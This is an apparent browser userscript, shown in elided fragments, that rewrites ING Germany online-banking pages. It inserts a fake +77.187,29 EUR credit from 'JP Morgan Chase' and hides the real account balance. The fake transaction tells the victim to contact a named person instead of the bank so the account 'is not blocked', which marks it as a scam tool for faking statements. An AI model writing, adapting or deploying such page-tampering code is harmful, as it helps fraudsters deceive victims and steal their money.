// ==UserScript==
// @name         Ed 4Rec  ing.kerstin.12105@web.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/548212/Ed%204Rec%20%20ingkerstin12105%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/548212/Ed%204Rec%20%20ingkerstin12105%40webde.meta.js
// ==/UserScript==
...
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
    ...
    const yourIBAN = '434 DE95 5001 0517 5455 5066 29'; // Replace with your IBAN
     // Specify the balance change you want to make (positive for increase, negative for decrease)
    const balanceChange = 1.0; // Example: decrease balance by 100.00 EUR
    const customTransactions = [
        {
            recipientName: 'JP Morgan Chase',
            transactionDetails: 'Treuhand: Freigabe nötig. An A. Gold wenden, nicht die Bank, damit nicht gesperrt wird.',
            transactionAmount: '+77.187,29',
            moveDirection: 'down',
            moveSteps: 0,
 ...
 //       {
 //           recipientName: 'JP Morgan Chase',
 //           transactionDetails: 'Test. Nur an Andreas Graf wenden.',
...
////CONFIGURE/////////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE///// ////CONFIGURE/////
     ...
     if (window.location.href.indexOf("ing.de") > 0 || window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("Downloads") > 0) {
...
observer.observe(document.body, observerConfig);
        ...
        if (window.location.href.indexOf("umsatzanzeige") > 0 || window.location.href.indexOf("ueberweisung") > 0 || window.location.href.indexOf("kontodetails") > 0 || window.location.href.indexOf("Downloads") > 0) {
...
if (window.location.href.indexOf("zahlungsverkehr/ueberweisung") > 0 || window.location.href.indexOf("Downloads") > 0) {
    function checkAndRemoveElements() {
  // Check if there are any elements with the class 'g2p-account__iban'
  const ibanElements = document.querySelectorAll('.g2p-account__iban');

  if (ibanElements.length > 0) {
    // If there are, remove all elements with the class 'g2p-account__balance g2p-amount'
    const balanceElements = document.querySelectorAll('.g2p-account__balance.g2p-amount');
...
setInterval(checkAndRemoveElements, 100);
      ...
      if (window.location.href.indexOf("obligo/obligo") > 0 || window.location.href.indexOf("Downloads") > 0) {
